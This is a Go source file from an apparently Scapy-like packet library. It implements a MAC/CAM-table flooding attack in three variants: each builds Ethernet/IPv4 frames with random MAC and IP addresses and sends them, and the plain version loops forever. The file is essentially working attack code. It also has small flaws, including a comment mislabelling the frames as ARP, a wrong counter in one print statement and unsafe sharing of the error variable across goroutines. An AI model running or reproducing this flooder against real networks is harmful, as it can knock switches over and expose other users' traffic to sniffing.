package higherlevel

import (
	"fmt"
	"sync"

	golayers "github.com/google/gopacket/layers"
	craft "github.com/tiagomdiogo/GoPpy/packet"
	communication "github.com/tiagomdiogo/GoPpy/supersocket"
	"github.com/tiagomdiogo/GoPpy/utils"
)

func Cam(iface string, packetCount int) {

	ss, err := communication.NewSuperSocket(iface, "")
	if err != nil {
		fmt.Println("Error creating SuperSocket:", err)
		return
	}

	packets := make([][]byte, packetCount)
	var wg sync.WaitGroup

	for i := 0; i < packetCount; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			randomSrcMAC := utils.ParseMACGen()
			randomDstMac := utils.ParseMACGen()
			etherLayer := craft.EthernetLayer()
			etherLayer.SetSrcMAC(randomSrcMAC)
			etherLayer.SetDstMAC(randomDstMac)
			etherLayer.SetEthernetType(golayers.EthernetTypeIPv4)
			ipLayer := craft.IPv4Layer()
			ipLayer.SetSrcIP(utils.ParseIPGen())
			ipLayer.SetDstIP(utils.ParseIPGen())

			packets[i], err = craft.CraftPacket(etherLayer.Layer(), ipLayer.Layer())
			if err != nil {
				fmt.Println("Error crafting Ethernet packet:", err)
				return
			}
			fmt.Println("Produced packet number:", packetCount)
		}(i)
	}

	wg.Wait()

	// Flood the network with the ARP packets
	for {
		fmt.Println("Sending Created packets")
		err = ss.SendMultiplePackets(packets, 10)
		if err != nil {
			fmt.Println("Error sending packets:", err)
			return
		}
	}
}

func CamBatch(iface string, packetCount int) {

	const batchSize = 1000000
	ss, err := communication.NewSuperSocket(iface, "")
	if err != nil {
		fmt.Println("Error creating SuperSocket:", err)
		return
	}

	var wg sync.WaitGroup

	for start := 0; start < packetCount; start += batchSize {
		end := start + batchSize
		if end > packetCount {
			end = packetCount
		}

		packets := make([][]byte, end-start)

		for i := start; i < end; i++ {
			wg.Add(1)
			go func(i int) {
				defer wg.Done()
				randomSrcMAC := utils.ParseMACGen()
				randomDstMac := utils.ParseMACGen()
				etherLayer := craft.EthernetLayer()
				etherLayer.SetSrcMAC(randomSrcMAC)
				etherLayer.SetDstMAC(randomDstMac)
				etherLayer.SetEthernetType(golayers.EthernetTypeIPv4)
				ipLayer := craft.IPv4Layer()
				ipLayer.SetSrcIP(utils.ParseIPGen())
				ipLayer.SetDstIP(utils.ParseIPGen())

				localIdx := i - start // adjust index for current batch
				packets[localIdx], err = craft.CraftPacket(etherLayer.Layer(), ipLayer.Layer())
				if err != nil {
					fmt.Println("Error crafting Ethernet packet:", err)
					return
				}
				fmt.Println("Produced packet number:", i)
			}(i)
		}

		wg.Wait()

		// Send this batch of packets
		fmt.Println("Sending Created packets")
		err = ss.SendMultiplePackets(packets, 10)
		if err != nil {
			fmt.Println("Error sending packets:", err)
			return
		}
	}
}

func CamStream(iface string, packetCount int) {
	ss, err := communication.NewSuperSocket(iface, "")
	if err != nil {
		fmt.Println("Error creating SuperSocket:", err)
		return
	}

	var wg sync.WaitGroup
	semaphore := make(chan struct{}, 50) // Limit to 50 concurrent goroutines

	for i := 0; i < packetCount; i++ {
		wg.Add(1)
		go func(i int) {
			semaphore <- struct{}{} // Acquire a slot in the semaphore channel
			defer func() {
				<-semaphore // Release the slot
				wg.Done()
			}()

			randomSrcMAC := utils.ParseMACGen()
			randomDstMAC := utils.ParseMACGen()
			etherLayer := craft.EthernetLayer()
			etherLayer.SetSrcMAC(randomSrcMAC)
			etherLayer.SetDstMAC(randomDstMAC)
			etherLayer.SetEthernetType(golayers.EthernetTypeIPv4)
			ipLayer := craft.IPv4Layer()
			ipLayer.SetSrcIP(utils.ParseIPGen())
			ipLayer.SetDstIP(utils.ParseIPGen())

			packet, err := craft.CraftPacket(etherLayer.Layer(), ipLayer.Layer())
			if err != nil {
				fmt.Println("Error crafting Ethernet packet:", err)
				return
			}

			fmt.Println("Produced packet number:", i)

			// Send packet
			err = ss.Send(packet)
			if err != nil {
				fmt.Println("Error sending packet:", err)
				return
			}
		}(i)
	}

	wg.Wait()
	close(semaphore)
}
